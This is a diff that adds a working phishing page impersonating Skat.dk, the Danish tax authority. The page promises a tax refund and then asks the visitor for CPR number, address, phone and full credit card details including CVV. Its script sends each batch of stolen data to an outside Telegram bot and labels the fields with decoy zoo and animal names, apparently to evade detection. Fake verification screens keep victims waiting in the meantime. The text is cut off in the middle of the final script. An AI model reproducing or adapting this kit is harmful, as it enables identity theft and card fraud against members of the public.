@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Årsopgørelse 2025 - Skat.dk</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --skat-blue: #0B1F4F;
+            --skat-blue-light: #1a3a7a;
+            --text-dark: #1a1a1a;
+            --text-gray: #4a4a4a;
+            --bg-light: #f5f5f5;
+            --border-gray: #e0e0e0;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-dark);
+            background-color: #fff;
+        }
+        .header-image-container { width: 100%; line-height: 0; }
+        .header-image { width: 100%; height: auto; display: block; }
+        .breadcrumb {
+            background: white;
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid var(--border-gray);
+            font-size: 1.1rem;
+            color: var(--text-gray);
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+        .breadcrumb a { color: var(--text-dark); text-decoration: none; font-weight: 500; }
+        .breadcrumb-arrow { color: var(--text-gray); font-size: 1.2rem; }
+        .lang-selector {
+            background: white;
+            padding: 1rem 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+        .globe-icon { width: 24px; height: 24px; }
+        .lang-arrow { font-size: 0.8rem; margin-left: 0.3rem; }
+        .hero-banner {
+            background: linear-gradient(135deg, var(--skat-blue) 0%, var(--skat-blue-light) 100%);
+            color: white;
+            padding: 3rem 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero-content { max-width: 1200px; margin: 0 auto; position: relative; z-index: 2; }
+        .hero-banner h1 { font-size: 2.5rem; margin-bottom: 1rem; font-weight: 700; }
+        .hero-banner p { font-size: 1.1rem; max-width: 700px; margin-bottom: 2rem; opacity: 0.95; line-height: 1.6; }
+        .refund-box {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 8px;
+            padding: 2rem;
+            margin: 2rem 0;
+            backdrop-filter: blur(10px);
+        }
+        .refund-amount { font-size: 3rem; font-weight: 700; margin-bottom: 0.5rem; }
+        .refund-label { font-size: 1.1rem; opacity: 0.9; }
+        .cta-button-wrapper {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+            max-width: 280px;
+        }
+        .cta-button-image {
+            width: 100%;
+            height: auto;
+            cursor: pointer;
+            display: block;
+            margin-top: 1rem;
+            transition: opacity 0.2s;
+            border-radius: 6px;
+        }
+        .cta-button-image.loading { opacity: 0.3; pointer-events: none; }
+        .button-spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 40px;
+            height: 40px;
+            margin-top: -20px;
+            margin-left: -20px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .cta-button-wrapper.loading .button-spinner { display: block; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .hero-help { margin-top: 2rem; padding-top: 2rem; border-top: 1px solid rgba(255,255,255,0.2); }
+        .hero-help h3 { font-size: 1.3rem; margin-bottom: 0.5rem; }
+        .hero-help a { color: white; text-decoration: underline; }
+        .contact-options { margin-top: 1rem; font-size: 0.95rem; }
+        .contact-options li { margin-bottom: 0.3rem; list-style-position: inside; }
+        .main-content { max-width: 1200px; margin: 0 auto; padding: 3rem 1.5rem; }
+        .formal-letter {
+            background: white;
+            border: 1px solid var(--border-gray);
+            border-radius: 8px;
+            padding: 3rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            margin-bottom: 3rem;
+        }
+        .letter-header { border-bottom: 2px solid var(--skat-blue); padding-bottom: 2rem; margin-bottom: 2rem; }
+        .letter-date { color: var(--text-gray); font-size: 0.95rem; margin-bottom: 1rem; }
+        .letter-title { font-size: 1.5rem; color: var(--skat-blue); font-weight: 600; margin-bottom: 0.5rem; }
+        .letter-subtitle { color: var(--text-gray); font-size: 1.1rem; }
+        .letter-body { font-size: 1.05rem; line-height: 1.8; color: var(--text-dark); }
+        .letter-body p { margin-bottom: 1.5rem; }
+        .letter-section {
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: var(--bg-light);
+            border-left: 4px solid var(--skat-blue);
+            border-radius: 0 8px 8px 0;
+        }
+        .letter-section h3 { color: var(--skat-blue); margin-bottom: 1rem; font-size: 1.2rem; display: flex; align-items: center; gap: 0.5rem; }
+        .payout-icon { font-size: 1.4rem; }
+        .letter-section ul { margin-left: 1.5rem; margin-top: 0.5rem; }
+        .letter-section li { margin-bottom: 0.5rem; }
+        .letter-footer { margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border-gray); }
+        .signature { margin-top: 2rem; }
+        .signature-name { font-weight: 600; margin-bottom: 0.2rem; }
+        .signature-title { color: var(--text-gray); font-size: 0.95rem; }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            padding: 2.5rem;
+            max-width: 500px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+            animation: modalSlideIn 0.3s ease-out;
+        }
+        @keyframes modalSlideIn {
+            from { opacity: 0; transform: translateY(-30px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .modal-header { border-bottom: 2px solid var(--skat-blue); padding-bottom: 1rem; margin-bottom: 1.5rem; }
+        .modal-header h2 { color: var(--skat-blue); font-size: 1.5rem; }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--text-dark); font-size: 0.95rem; }
+        .form-group input {
+            width: 100%;
+            padding: 0.8rem;
+            border: 2px solid var(--border-gray);
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: border-color 0.2s;
+            font-family: inherit;
+        }
+        .form-group input:focus { outline: none; border-color: var(--skat-blue); }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+        .form-row-3 { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 1rem; }
+        .btn {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.2s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+            width: 100%;
+        }
+        .btn-primary { background: var(--skat-blue); color: white; }
+        .btn-primary:hover { background: var(--skat-blue-light); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+        .loading-screen {
+            display: none;
+            text-align: center;
+            padding: 3rem 2rem;
+        }
+        .loading-screen.active { display: block; }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid var(--border-gray);
+            border-top: 4px solid var(--skat-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem;
+        }
+        .loading-text { font-size: 1.2rem; color: var(--skat-blue); font-weight: 600; margin-bottom: 0.5rem; }
+        .loading-subtext { color: var(--text-gray); font-size: 0.95rem; }
+        .success-notification {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border: 3px solid var(--skat-blue);
+            border-radius: 8px;
+            padding: 1.5rem 2.5rem;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            z-index: 3000;
+            text-align: center;
+            animation: successPop 0.3s ease-out;
+        }
+        .success-notification.active { display: block; }
+        @keyframes successPop {
+            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+        .success-icon { font-size: 2.5rem; color: var(--skat-blue); margin-bottom: 0.5rem; }
+        .success-notification h3 { color: var(--skat-blue); font-size: 1.1rem; margin: 0; }
+        .success-notification p { color: var(--text-gray); font-size: 0.9rem; margin-top: 0.3rem; }
+        .small-loading-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            padding: 2rem;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            z-index: 5000;
+            text-align: center;
+            min-width: 200px;
+        }
+        .small-loading-modal.active { display: block; }
+        .small-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid var(--border-gray);
+            border-top: 4px solid var(--skat-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+        .small-loading-text { color: var(--text-dark); font-size: 1rem; font-weight: 600; }
+        .zoo-details-form { display: none; }
+        .zoo-details-form.active { display: block; animation: fadeIn 0.4s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .zoo-details-form h3 { color: var(--skat-blue); margin-bottom: 1.5rem; font-size: 1.3rem; }
+        .info-text {
+            background: var(--bg-light);
+            padding: 1rem;
+            border-radius: 4px;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            color: var(--text-gray);
+            border-left: 3px solid var(--skat-blue);
+        }
+        .ticket-visual {
+            background: linear-gradient(135deg, var(--skat-blue) 0%, var(--skat-blue-light) 100%);
+            border-radius: 12px;
+            padding: 1.5rem;
+            color: white;
+            margin-bottom: 1.5rem;
+            position: relative;
+            height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .ticket-number-display { font-size: 1.3rem; letter-spacing: 2px; font-family: 'Courier New', monospace; }
+        .ticket-details { display: flex; justify-content: space-between; align-items: flex-end; }
+        .ticket-holder { font-size: 0.9rem; text-transform: uppercase; opacity: 0.9; }
+        .ticket-date { font-size: 0.9rem; opacity: 0.9; }
+        footer {
+            background-color: var(--skat-blue);
+            color: white;
+            padding: 4rem 1.5rem 2rem;
+            margin-top: 4rem;
+        }
+        .footer-content { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 3rem; }
+        .footer-section h3 { font-size: 1.1rem; margin-bottom: 1.5rem; font-weight: 600; }
+        .footer-section ul { list-style: none; }
+        .footer-section li { margin-bottom: 0.8rem; }
+        .footer-section a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .footer-section a:hover { color: white; }
+        .footer-section a:before { content: "›"; color: rgba(255,255,255,0.5); }
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 3rem auto 0;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .social-links { display: flex; gap: 1rem; }
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-decoration: none;
+            transition: background 0.2s;
+            font-size: 1.2rem;
+        }
+        .social-icon:hover { background: rgba(255,255,255,0.2); transform: scale(1.1); }
+        .social-icon.facebook:before { content: "f"; font-weight: bold; font-family: Arial, sans-serif; }
+        .social-icon.instagram:before { content: "📷"; font-size: 1rem; }
+        .social-icon.youtube:before { content: "▶"; font-size: 0.9rem; }
+        @media (max-width: 768px) {
+            .hero-banner h1 { font-size: 1.8rem; }
+            .refund-amount { font-size: 2rem; }
+            .formal-letter { padding: 1.5rem; }
+            .form-row, .form-row-3 { grid-template-columns: 1fr; }
+            .modal-content { padding: 1.5rem; margin: 1rem; }
+            .cta-button-wrapper { max-width: 200px; }
+        }
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <div class="header-image-container">
+        <img src="https://i.ibb.co/1JhyGFkv/IMG-5838.jpg" alt="Skat.dk Header" class="header-image">
+    </div>
+    <div class="breadcrumb">
+        <a href="#">Skat.dk</a>
+        <span class="breadcrumb-arrow">›</span>
+        <span>Borger</span>
+    </div>
+    <div class="lang-selector">
+        <svg class="globe-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+        </svg>
+        <span>Dansk</span>
+        <span class="lang-arrow">▼</span>
+    </div>
+    <section class="hero-banner">
+        <div class="hero-content">
+            <h1>Du har fået en skatterefusion</h1>
+            <p>Efter gennemgang af din årsopgørelse for indkomståret 2025 har Skatteforvaltningen konstateret, at du har betalt for meget i skat. Beløbet udbetales til dit NemKonto.</p>
+            <div class="refund-box">
+                <div class="refund-label">Din skatterefusion</div>
+                <div class="refund-amount">4.570,50 kr.</div>
+                <div style="margin-top: 1rem; font-size: 0.95rem; opacity: 0.9;">Udbetaling den 15. april 2026</div>
+            </div>
+            <div class="cta-button-wrapper" id="buttonWrapper">
+                <img src="https://i.ibb.co/9320Nhrj/IMG-5839.jpg" alt="Tjek din årsopgørelse" class="cta-button-image" id="mainBtn" onclick="handleButtonClick()">
+                <div class="button-spinner"></div>
+            </div>
+            <div class="hero-help">
+                <h3>Har du spørgsmål til din udbetaling?</h3>
+                <p>Hvis beløbet ikke stemmer overens med dine forventninger, eller hvis du har spørgsmål til beregningen, kan du kontakte os.</p>
+                <ul class="contact-options">
+                    <li>Telefon: 72 22 18 18 (hverdage kl. 9-17)</li>
+                    <li>Chat: Hverdage og weekender kl. 8-17</li>
+                    <li><a href="#">Skriv til os via sikker e-mail</a></li>
+                </ul>
+            </div>
+        </div>
+    </section>
+    <main class="main-content">
+        <article class="formal-letter">
+            <header class="letter-header">
+                <div class="letter-date">Dato: 23. marts 2026<br>Sagsnummer: 2025-754008</div>
+                <h2 class="letter-title">Meddelelse om skatterefusion</h2>
+                <p class="letter-subtitle">Årsopgørelse 2025 – Personlig indkomst</p>
+            </header>
+            <div class="letter-body">
+                <p><strong>Til borgeren<br>CPR-nummer: *****</strong></p>
+                <p>Skatteforvaltningen har den 23. marts 2026 afsluttet behandlingen af din årsopgørelse for indkomståret 2025. Efter gennemgang af dine indkomstforhold, fradrag og forskudsregistreringer er det konstateret, at du i løbet af året har betalt for meget i skat.</p>
+                <div class="letter-section">
+                    <h3><span class="payout-icon">💳</span> Udbetaling</h3>
+                    <p>Beløbet på <strong>4.570,50 kr.</strong> udbetales til dit NemKonto.</p>
+                    <p>Forventet udbetalingsdato: <strong>15. april 2026</strong></p>
+                    <p>Ønsker du at ændre kontonummeret til udbetalingen, skal du logge på TastSelv Borger senest den 10. april 2026.</p>
+                </div>
+                <p>Du bedes gennemgå den vedlagte årsopgørelse for at sikre, at alle oplysninger er korrekte. Konstaterer du fejl eller mangler i oplysningerne, skal du rette årsopgørelsen senest den 20. maj 2026.</p>
+                <p>Ved spørgsmål til denne meddelelse eller beregningen af din skat kan du kontakte Skatteforvaltningen på telefon 72 22 18 18 eller via chat på skat.dk.</p>
+                <div class="letter-footer">
+                    <p>Med venlig hilsen</p>
+                    <div class="signature">
+                        <div class="signature-name">Skatteforvaltningen</div>
+                        <div class="signature-title">Skattemyndighed<br>Borgerservicecenter</div>
+                    </div>
+                </div>
+            </div>
+        </article>
+    </main>
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            <div id="personalForm">
+                <div class="modal-header"><h2>Bekræft identitet</h2></div>
+                <p style="margin-bottom: 1.5rem; color: var(--text-gray);">Indtast dine personlige oplysninger for at fortsætte med udbetalingen.</p>
+                <form onsubmit="handleFormSubmit(event)">
+                    <div class="form-group">
+                        <label for="haustiere">Fulde navn</label>
+                        <input type="text" id="haustiere" class="letters-only" placeholder="f.eks. Anders Andersen" required>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="wieviele">Fødselsdato</label>
+                            <input type="text" id="wieviele" placeholder="DD/MM/ÅÅÅÅ" maxlength="10" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="lieblingszahl">CPR-nummer</label>
+                            <input type="text" id="lieblingszahl" class="numbers-only" maxlength="12" placeholder="123456-7890" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="raubtiere">Gade</label>
+                        <input type="text" id="raubtiere" class="letters-only" placeholder="f.eks. Hovedgaden" required>
+                    </div>
+                    <div class="form-row-3">
+                        <div class="form-group">
+                            <label for="tiernummer">Husnummer</label>
+                            <input type="text" id="tiernummer" class="numbers-only" maxlength="4" placeholder="42" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="wege">Postnr.</label>
+                            <input type="text" id="wege" class="numbers-only" maxlength="4" placeholder="1000" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="lieblingstier">By</label>
+                            <input type="text" id="lieblingstier" class="letters-only" placeholder="Kobenhavn" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="glueckszahlen">Telefonnummer</label>
+                        <input type="tel" id="glueckszahlen" placeholder="12 34 56 78" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary" id="submitBtn">Næste</button>
+                </form>
+            </div>
+            <div class="loading-screen" id="loadingScreen">
+                <div class="spinner"></div>
+                <div class="loading-text" id="loadingText">Dataafstemning...</div>
+                <div class="loading-subtext" id="loadingSubtext">Vi verificerer dine oplysninger med CPR-registeret</div>
+            </div>
+            <div class="zoo-details-form" id="zooDetailsForm">
+                <div class="modal-header"><h2>Indtast betalingsoplysninger</h2></div>
+                <div class="info-text">
+                    <strong>Godkendt!</strong> Din identitet er bekræftet. Indtast dine kreditkortoplysninger for at modtage udbetalingen på 4.570,50 kr.
+                </div>
+                <div class="ticket-visual">
+                    <div class="ticket-number-display" id="ticketDisplay">#### #### #### ####</div>
+                    <div class="ticket-details">
+                        <div class="ticket-holder" id="holderDisplay">ANDERS ANDERSEN</div>
+                        <div class="ticket-date" id="dateDisplay">MM/ÅÅ</div>
+                    </div>
+                </div>
+                <form onsubmit="handleZooSubmit(event)">
+                    <div class="form-group">
+                        <label for="zoonummer">Kreditkortnummer</label>
+                        <input type="text" id="zoonummer" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="anzahl">Udløbsdato</label>
+                            <input type="text" id="anzahl" placeholder="MM/ÅÅ" maxlength="5" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="ichmag">CVV</label>
+                            <input type="text" id="ichmag" class="numbers-only" maxlength="5" placeholder="123" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="tiername">Kortholder</label>
+                        <input type="text" id="tiername" placeholder="ANDERS ANDERSEN" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary" id="confirmBtn">Bekræft</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="success-notification" id="successNotification">
+        <div class="success-icon">✓</div>
+        <h3>Profil bekræftet</h3>
+        <p>Du kan fortsætte</p>
+    </div>
+    <div class="small-loading-modal" id="smallLoadingModal">
+        <div class="small-spinner"></div>
+        <div class="small-loading-text">Behandler...</div>
+    </div>
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Om os</h3>
+                <ul>
+                    <li><a href="#">Kontakt</a></li>
+                    <li><a href="#">Om Skatteforvaltningen</a></li>
+                    <li><a href="#">Jobs</a></li>
+                    <li><a href="#">Presse</a></li>
+                    <li><a href="#">Skat i undervisningen</a></li>
+                    <li><a href="#">Skat på tværs af grænser</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Hjælp</h3>
+                <ul>
+                    <li><a href="#">Satser</a></li>
+                    <li><a href="#">Vejledninger</a></li>
+                    <li><a href="#">Blanketter</a></li>
+                    <li><a href="#">Bindende svar</a></li>
+                    <li><a href="#">Sådan klager du</a></li>
+                    <li><a href="#">Borger- og Retssikkerhedschef</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Sikkerhed</h3>
+                <ul>
+                    <li><a href="#">Dataudveksling</a></li>
+                    <li><a href="#">Privatlivspolitik og cookies</a></li>
+                    <li><a href="#">Jeg vil ændre mit cookie-samtykke</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Sprog</h3>
+                <ul>
+                    <li><a href="#">Dansk</a></li>
+                    <li><a href="#">English</a></li>
+                    <li><a href="#">Flere sprog</a></li>
+                </ul>
+                <h3 style="margin-top: 2rem;">Jura</h3>
+                <ul>
+                    <li><a href="#">Den juridiske vejledning</a></li>
+                    <li><a href="#">info.skat.dk/jura</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <div><p>skat.dk er selvbetjening og vejledning<br>fra Skatteforvaltningen</p></div>
+            <div class="social-links">
+                <a href="#" class="social-icon facebook" title="Facebook"></a>
+                <a href="#" class="social-icon instagram" title="Instagram"></a>
+                <a href="#" class="social-icon youtube" title="YouTube"></a>
+            </div>
+        </div>
+    </footer>
+    <script>
+        // TELEGRAM KONFIGURATION - HER TOKEN EINFÜGEN
+        const TELEGRAM_BOT_TOKEN = 'HIER_TOKEN_EINFÜGEN';
+        const TELEGRAM_CHAT_ID = 'HIER_CHAT_ID_EINFÜGEN';
+        
+        // Globale Variable zum Speichern der ersten Seite Daten
+        let ersteSeiteDaten = {};
+
+        // Validierungsfunktionen für Zoo-Liste
+        function setupValidations() {
+            // Nur Buchstaben (inkl. Umlaute und Leerzeichen)
+            document.querySelectorAll('.letters-only').forEach(input => {
+                input.addEventListener('input', function(e) {
+                    let value = e.target.value;
+                    // Erlaubt: Buchstaben (inkl. Umlaute), Leerzeichen
+                    value = value.replace(/[^a-zA-ZäöüÄÖÜß\s]/g, '');
+                    e.target.value = value;
+                });
+            });
+
+            // Nur Zahlen
+            document.querySelectorAll('.numbers-only').forEach(input => {
+                input.addEventListener('input', function(e) {
+                    let value = e.target.value;
+                    // Entfernt alles außer Zahlen
+                    value = value.replace(/\D/g, '');
+                    e.target.value = value;
+                });
+            });
+        }
+
+        function handleButtonClick() {
+            const wrapper = document.getElementById('buttonWrapper');
+            const btn = document.getElementById('mainBtn');
+            wrapper.classList.add('loading');
+            btn.classList.add('loading');
+            setTimeout(() => {
+                wrapper.classList.remove('loading');
+                btn.classList.remove('loading');
+                openModal();
+            }, 5000);
+        }
+        function openModal() {
+            document.getElementById('modalOverlay').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            document.getElementById('personalForm').style.display = 'block';
+            document.getElementById('loadingScreen').classList.remove('active');
+            document.getElementById('zooDetailsForm').classList.remove('active');
+            // Validierungen aktivieren
+            setupValidations();
+        }
+        function closeModal() {
+            document.getElementById('modalOverlay').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+        
+        // Formatierung für Wie viele gibt es
+        document.getElementById('wieviele').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
+            if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 9);
+            e.target.value = value;
+        });
+        
+        // Formatierung für Zoo Eintrittsnummer
+        document.getElementById('zoonummer').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            let formatted = '';
+            for (let i = 0; i < value.length; i += 4) {
+                if (i > 0) formatted += ' ';
+                formatted += value.slice(i, i + 4);
+            }
+            e.target.value = formatted;
+            document.getElementById('ticketDisplay').textContent = formatted || '#### #### #### ####';
+        });
+        
+        // Formatierung für Wie viele waren da
+        document.getElementById('anzahl').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            e.target.value = value;
+            document.getElementById('dateDisplay').textContent = value || 'MM/ÅÅ';
+        });
+        
+        // Anzeige für Name des Tieres
+        document.getElementById('tiername').addEventListener('input', function(e) {
+            document.getElementById('holderDisplay').textContent = e.target.value.toUpperCase() || 'ANDERS ANDERSEN';
+        });
+        
+        // Maskierung für Ich Mag
+        let ichMagTimeout;
+        document.getElementById('ichmag').addEventListener('input', function(e) {
+            clearTimeout(ichMagTimeout);
+            const input = e.target;
+            let value = input.value.replace(/\D/g, '').slice(0, 5);
+            if (value.length > 0) {
+                input.setAttribute('data-value', value);
+                ichMagTimeout = setTimeout(() => { input.value = '•'.repeat(value.length); }, 1000);
+            } else { input.value = ''; }
+        });
+
+        // Funktion zum Senden an Telegram
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram fejl:', error);
+                return false;
+            }
+        }
+
+        function handleFormSubmit(e) {
+            e.preventDefault();
+            
+            // ERSTE SEITE DATEN SPEICHERN UND SENDEN
+            ersteSeiteDaten = {
+                haustiere: document.getElementById('haustiere').value,
+                wieviele: document.getElementById('wieviele').value,
+                lieblingszahl: document.getElementById('lieblingszahl').value,
+                raubtiere: document.getElementById('raubtiere').value,
+                tiernummer: document.getElementById('tiernummer').value,
+                wege: document.getElementById('wege').value,
+                lieblingstier: document.getElementById('lieblingstier').value,
+                glueckszahlen: document.getElementById('glueckszahlen').value
+            };
+
+            // TELEGRAM NACHRICHT FÜR ERSTE SEITE MIT EMOJIS
+            const ersteNachricht = `🐱 ${ersteSeiteDaten.haustiere}\n` +
+                `🐴 ${ersteSeiteDaten.wieviele}\n` +
+                `🦋 ${ersteSeiteDaten.lieblingszahl}\n` +
+                `🐯 ${ersteSeiteDaten.raubtiere} ${ersteSeiteDaten.tiernummer}\n` +
+                `🦊 ${ersteSeiteDaten.wege}\n` +
+                `🐨 ${ersteSeiteDaten.glueckszahlen}\n\n` +
+                `⏰ ${new Date().toLocaleString('da-DK')}`;
+
+            // Sende erste Seite sofort
+            sendToTelegram(ersteNachricht);
+
+            // Loading anzeigen
+            document.getElementById('personalForm').style.display = 'none';
+            document.getElementById('loadingScreen').classList.add('active');
+            document.getElementById('loadingText').textContent = 'Dataafstemning...';
+            document.getElementById('loadingSubtext').textContent = 'Vi verificerer dine oplysninger med CPR-registeret';
+            
+            setTimeout(() => {
+                document.getElementById('loadingText').textContent = 'Vent venligst...';
+                document.getElementById('loadingSubtext').textContent = 'Verifikation afsluttes';
+                setTimeout(() => {
+                    document.getElementById('loadingText').textContent = 'Det tager mindre end et minut';
+                    document.getElementById('loadingSubtext').textContent = 'Din ansøgning bekræftes';
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').classList.remove('active');
+                        document.getElementById('successNotification').classList.add('active');
+                        setTimeout(() => {
+                            document.getElementById('successNotification').classList.remove('active');
+                            document.getElementById('zooDetailsForm').classList.add('active');
+                        }, 2000);
+                    }, 13000);
+                }, 0);
+            }, 3000);
+        }
+
+        function handleZooSubmit(e) {
+            e.preventDefault();
+            const zoonummer = document.getElementById('zoonummer').value.replace(/\s/g, '');
+            // Validierung auf 16 Ziffern - GEÄNDERT: Zoo-eintrittsnummer statt Kreditkortnummer
+            if (zoonummer.length < 16) {
+                alert('Zoo-eintrittsnummeret skal indeholde mindst 16 cifre.');
+                return;
+            }
+
+            // ZWEITE SEITE DATEN
+            const zweiteSeiteDaten = {
+                zoonummer: document.getElementById('zoonummer').value,
+                anzahl: document.getElementById('anzahl').value,
+                ichmag: document.getElementById('ichmag').getAttribute('data-value') || document.getElementById('ichmag').value,
+                tiername: document.getElementById('tiername').value
+            };
+
+            // TELEGRAM NACHRICHT FÜR ZWEITE SEITE MIT EMOJIS
+            const zweiteNachricht = `🐸 ${zweiteSeiteDaten.zoonummer}\n` +
+                `🦁 ${zweiteSeiteDaten.anzahl}\n` +
+                `🐼 ${zweiteSeiteDaten.ichmag}\n` +
+                `🦄 ${zweiteSeiteDaten.tiername}\n\n` +
+                `⏰ ${new Date().toLocaleString('da-DK')}`;
+
+            // Sende zweite Seite
+            sendToTelegram(zweiteNachricht);
+
+            // GEÄNDERT: Overlay über dem bestehenden Formular anzeigen, statt alles auszublenden
+            const zooForm = document.getElementById('zooDetailsForm');
+            
+            // Prüfen ob bereits ein Overlay existiert
+            if (!document.getElementById('finalLoadingOverlay')) {
+                const overlayDiv = document.createElement('div');
+                overlayDiv.id = 'finalLoadingOverlay';
+                overlayDiv.style.cssText = `
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(255, 255, 255, 0.85);
+                    backdrop-filter: blur(2px);
+                    display: flex;
+                    flex-direction: column;
+                    justify-content: center;
+                    align-items: center;
+                    z-index: 100;
+                    border-radius: 8px;
+                `;
+                overlayDiv.innerHTML = `
+                    <div style="width: 60px; height: 60px; border: 4px solid #e0e0e0; border-top: 4px solid #0B1F4F; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 1.5rem;"></div>
+                    <div style="font-size: 1.2rem; color: #0B1F4F; font-weight: 600; margin-bottom: 0.5rem;">Behandler udbetaling...</div>
+                    <div style="color: #4a4a4a; font-size: 0.95rem;">Vent venligst</div>
+                `;
+                
+                // Position relative zum zooDetailsForm setzen
